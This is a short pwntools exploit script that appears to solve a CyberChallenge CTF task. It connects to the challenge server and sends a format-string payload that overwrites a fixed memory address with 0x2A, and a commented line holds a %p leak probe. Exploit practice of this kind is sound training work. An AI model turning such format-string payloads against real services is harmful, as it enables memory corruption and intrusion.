from pwn import *

context.arch = 'amd64'
conn = remote('answer.challs.cyberchallenge.it', 9122)

answer_value = 0x2A
answer_addr = 0x601078

response = conn.recvuntil('?')
print(response)

payload = fmtstr_payload(10, {answer_addr: answer_value})
#payload = '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'

conn.sendline(payload)
print(payload)


conn.interactive()